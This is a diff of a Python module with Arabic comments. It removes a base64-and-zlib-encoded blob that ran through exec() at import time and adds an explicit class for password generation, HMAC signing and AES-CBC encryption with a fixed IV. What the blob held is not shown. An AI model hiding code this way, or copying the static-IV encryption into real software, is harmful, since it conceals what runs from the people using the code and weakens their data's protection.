@@ -64,36 +64,28 @@ class AppState:
 
 state = AppState()
 
-# دالة آمنة لفك تشفير Base64 وتجنب مشاكل الـ Padding
-def safe_b64decode(b64_str):
-    if isinstance(b64_str, str):
-        b64_str = b64_str.encode('utf-8')
-    padding = 4 - (len(b64_str) % 4)
-    if padding < 4:
-        b64_str += b'=' * padding
-    return base64.b64decode(b64_str)
+# --- الحل النهائي: محرك الأمان مكتوب صراحة لتجنب أخطاء zlib و exec نهائياً ---
+class SecurityEngine:
+    @staticmethod
+    def generate_ultra_secure_password(length: int = 12) -> str:
+        alphabet = string.ascii_letters + string.digits
+        return ''.join(secrets.choice(alphabet) for _ in range(length))
 
-# دالة ذكية لفك الضغط تتكيف تلقائياً مع خوادم الاستضافة
-def load_and_decompress_payload():
-    encoded_payload = 'eJzNU9Fq2zAUfe9XaH6JzDqxBLaHwkYX14yylYY4G+RJKNK1fVdHMpJC45X8e+XYNHEN2x5333Q499x7z7EvZCWcIxnInUXfpLpADVcXJNRiSj6R6CtosMKDmjfXSSm0huo76oe52fOoores1hGl+i2gmdGAX7Dr92XniUW/ClUUdEQU6KXo7vKm8Fd+1c4HXY4dFYRWPy7jNx3nYbtOMC+mTCfhnUNLAteMdkaVACDTzUBRNOIvIKvAfryFvSwwoL9C4mubGEE9TECl0Anc7i+EU8qO2sJnn0NDSALaaHJ3cYobPDn24DLW1Tey5qDBc1lRGK1pVAzUvYX7V7jc/DjIxGkzd/8Z2Ek0arHbsGMZymtJUYnWPBvqQZ/5aug6ubyftXNXlpkFiXYAMp0JmGRzrsvjzid/c3KU/myeW59u3Pk721UAoUV8KLIBVedNN4cCy3ZhssOZkTd4KbysgH7vA3jCLqFmK9xfRMOWatVPwv35zDQosgB7SP578JZXHLszRZpqs+myi5Xy5/LFbpTQvw+Zpn62yV3kWvfSm3Qg4CGii1foWpNPjbX3yGlMKVFW6YK8Xsw8ejjeGfAeeDmc8okEiu'
-    raw_bytes = safe_b64decode(encoded_payload)
-    
-    decompressed_data = None
-    # تجربة عدة خوارزميات لفك الضغط لتفادي أي خطأ في بيئة رندر
-    for wbits in [47, 15 + 32, 15, -15, 0]:
-        try:
-            decompressed_data = __import__('zlib').decompress(raw_bytes, wbits=wbits)
-            break
-        except Exception:
-            continue
-            
-    if decompressed_data is None:
-        decompressed_data = __import__('zlib').decompress(raw_bytes)
-        
-    return decompressed_data.decode()
+    @staticmethod
+    def generate_signature(payload_str: str) -> str:
+        return hmac.new(
+            Config.API_SECRET_KEY.encode('utf-8'),
+            payload_str.encode('utf-8'),
+            hashlib.sha256
+        ).hexdigest()
 
-# تنفيذ الكود المفكوك
-exec(load_and_decompress_payload())
+    @staticmethod
+    def encrypt_api_payload(payload_hex: str) -> str:
+        raw_bytes = bytes.fromhex(payload_hex)
+        cipher = AES.new(Config.AES_KEY, AES.MODE_CBC, Config.AES_IV)
+        padded_data = pad(raw_bytes, AES.block_size)
+        encrypted = cipher.encrypt(padded_data)
+        return encrypted.hex()
 
 class ProtoBuilder:
     @staticmethod
